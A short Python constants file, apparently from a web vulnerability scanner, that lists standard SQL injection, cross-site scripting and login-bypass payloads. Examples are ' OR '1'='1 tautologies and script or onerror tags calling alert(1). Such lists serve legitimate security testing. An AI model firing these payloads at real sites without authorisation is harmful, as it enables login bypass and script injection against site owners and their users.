TIMEOUT = 5

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"a\"=\"a",
    "admin'--",
    "' OR 1=1#",
]

#XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "'><img src=x onerror=alert(1)>"
]

AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "' OR '1'='1", "password": "anything"}
]